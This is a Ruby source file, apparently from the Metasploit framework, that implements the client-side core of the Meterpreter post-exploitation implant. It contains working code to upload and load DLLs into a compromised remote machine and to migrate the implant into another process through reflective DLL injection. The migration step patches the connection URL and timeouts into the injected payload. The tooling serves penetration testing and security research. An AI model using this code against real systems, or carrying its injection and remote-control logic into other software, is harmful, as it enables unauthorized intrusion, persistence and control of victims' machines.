#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/packet'
require 'rex/post/meterpreter/extension'
require 'rex/post/meterpreter/client'

# Used to generate a reflective DLL when migrating. This is yet another
# argument for moving the meterpreter client into the Msf namespace.
require 'msf/core/payload/windows'

module Rex
module Post
module Meterpreter

###
#
# This class is responsible for providing the interface to the core
# client-side meterpreter API which facilitates the loading of extensions
# and the interaction with channels.
#
#
###
class ClientCore < Extension

  #
  # Initializes the 'core' portion of the meterpreter client commands.
  #
  def initialize(client)
    super(client, "core")
  end

  ##
  #
  # Core commands
  #
  ##

  #
  # Loads a library on the remote meterpreter instance.  This method
  # supports loading both extension and non-extension libraries and
  # also supports loading libraries from memory or disk depending
  # on the flags that are specified
  #
  # Supported flags:
  #
  #	LibraryFilePath
  #		The path to the library that is to be loaded
  #
  #	TargetFilePath
  #		The target library path when uploading
  #
  #	UploadLibrary
  #		Indicates whether or not the library should be uploaded
  #
  #	SaveToDisk
  #		Indicates whether or not the library should be saved to disk
  #		on the remote machine
  #
  #	Extension
  #		Indicates whether or not the library is a meterpreter extension
  #
  def load_library(opts)
    library_path = opts['LibraryFilePath']
    target_path  = opts['TargetFilePath']
    load_flags   = LOAD_LIBRARY_FLAG_LOCAL

    # No library path, no cookie.
    if (library_path == nil)
      raise ArgumentError, "No library file path was supplied", caller
    end

    # Set up the proper loading flags
    if (opts['UploadLibrary'])
      load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
    end
    if (opts['SaveToDisk'])
      load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
    end
    if (opts['Extension'])
      load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
    end

    # Create a request packet
    request = Packet.create_request('core_loadlib')

    # If we must upload the library, do so now
    if ((load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL)
      image = ''

      ::File.open(library_path, 'rb') { |f|
        image = f.read
      }

      if (image != nil)
        request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
      else
        raise RuntimeError, "Failed to serialize library #{library_path}.", caller
      end

      # If it's an extension we're dealing with, rename the library
      # path of the local and target so that it gets loaded with a random
      # name
      if (opts['Extension'])
        library_path = "ext" + rand(1000000).to_s + ".#{client.binary_suffix}"
        target_path  = library_path
      end
    end

    # Add the base TLVs
    request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
    request.add_tlv(TLV_TYPE_FLAGS, load_flags)

    if (target_path != nil)
      request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
    end

    # Transmit the request and wait the default timeout seconds for a response
    response = self.client.send_packet_wait_response(request, self.client.response_timeout)

    # No response?
    if (response == nil)
      raise RuntimeError, "No response was received to the core_loadlib request.", caller
    elsif (response.result != 0)
      raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
    end

    commands = []
    response.each(TLV_TYPE_METHOD) { |c|
      commands << c.value
    }

    return commands
  end

  #
  # Loads a meterpreter extension on the remote server instance and
  # initializes the client-side extension handlers
  #
  #	Module
  #		The module that should be loaded
  #
  #	LoadFromDisk
  #		Indicates that the library should be loaded from disk, not from
  #		memory on the remote machine
  #
  def use(mod, opts = { })
    if (mod == nil)
      raise RuntimeError, "No modules were specified", caller
    end
    # Get us to the installation root and then into data/meterpreter, where
    # the file is expected to be
    path = ::File.join(Msf::Config.data_directory, 'meterpreter', 'ext_server_' + mod.downcase + ".#{client.binary_suffix}")

    if (opts['ExtensionPath'])
      path = opts['ExtensionPath']
    end

    path = ::File.expand_path(path)

    # Load the extension DLL
    commands = load_library(
        'LibraryFilePath' => path,
        'UploadLibrary'   => true,
        'Extension'       => true,
        'SaveToDisk'      => opts['LoadFromDisk'])
    client.add_extension(mod, commands)

    return true
  end

  #
  # Migrates the meterpreter instance to the process specified
  # by pid.  The connection to the server remains established.
  #
  def migrate( pid )
    keepalive = client.send_keepalives
    client.send_keepalives = false
    process       = nil
    binary_suffix = nil

    # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
    client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )

    # Determine the architecture for the pid we are going to migrate into...
    client.sys.process.processes.each { | p |
      if( p['pid'] == pid )
        process = p
        break
      end
    }

    # We cant migrate into a process that does not exist.
    if( process == nil )
      raise RuntimeError, "Cannot migrate into non existent process", caller
    end

    # We cant migrate into a process that we are unable to open
    if( process['arch'] == nil or process['arch'].empty? )
      raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
    end

    # And we also cant migrate into our own current process...
    if( process['pid'] == client.sys.process.getpid )
      raise RuntimeError, "Cannot migrate into current process", caller
    end

    # Create a new payload stub
    c = Class.new( ::Msf::Payload )
    c.include( ::Msf::Payload::Stager )

    # Include the appropriate reflective dll injection module for the target process architecture...
    if( process['arch'] == ARCH_X86 )
      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
      binary_suffix = "x86.dll"
    elsif( process['arch'] == ARCH_X86_64 )
      c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
      binary_suffix = "x64.dll"
    else
      raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
    end

    # Create the migrate stager
    migrate_stager = c.new()
    migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.data_directory, "meterpreter", "metsrv.#{binary_suffix}" )

    blob = migrate_stager.stage_payload

    if client.passive_service

      # Replace the transport string first (TRANSPORT_SOCKET_SSL
      i = blob.index("METERPRETER_TRANSPORT_SSL")
      if i
        str = client.ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
        blob[i, str.length] = str
      end

      conn_id = self.client.conn_id
      i = blob.index("https://" + ("X" * 256))
      if i
        str = self.client.url
        blob[i, str.length] = str
      end

      i = blob.index([0xb64be661].pack("V"))
      if i
        str = [ self.client.expiration ].pack("V")
        blob[i, str.length] = str
      end

      i = blob.index([0xaf79257f].pack("V"))
      if i
        str = [ self.client.comm_timeout ].pack("V")
        blob[i, str.length] = str
      end
    end

    # Build the migration request
    request = Packet.create_request( 'core_migrate' )
    request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
    if( process['arch'] == ARCH_X86_64 )
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
    else
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
    end

    # Send the migration request (bump up the timeout to 60 seconds)
    response = client.send_request( request, 60 )

    if client.passive_service
      # Sleep for 5 seconds to allow the full handoff, this prevents
      # the original process from stealing our loadlib requests
      ::IO.select(nil, nil, nil, 5.0)
    else
      # Prevent new commands from being sent while we finish migrating
      client.comm_mutex.synchronize do
        # Disable the socket request monitor
        client.monitor_stop

        ###
        # Now communicating with the new process
        ###

        # Renegotiate SSL over this socket
        client.swap_sock_ssl_to_plain()
        client.swap_sock_plain_to_ssl()

        # Restart the socket monitor
        client.monitor_socket
      end
    end

    # Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
    # If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
    if( process['arch'] == ARCH_X86_64 )
      client.platform      = 'x64/win64'
      client.binary_suffix = 'x64.dll'
    else
      client.platform      = 'x86/win32'
      client.binary_suffix = 'x86.dll'
    end

    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
    client.ext.aliases.keys.each { |e|
      client.core.use(e)
    }

    # Restore session keep-alives
    client.send_keepalives = keepalive

    return true
  end

  #
  # Shuts the session down
  #
  def shutdown
    request  = Packet.create_request('core_shutdown')

    # If this is a standard TCP session, send and return
    if not client.passive_service
      self.client.send_packet(request)
    else
    # If this is a HTTP/HTTPS session we need to wait a few seconds
    # otherwise the session may not receive the command before we
    # kill the handler. This could be improved by the server side
    # sending a reply to shutdown first.
      self.client.send_packet_wait_response(request, 10)
    end
    true
  end

end

end; end; end

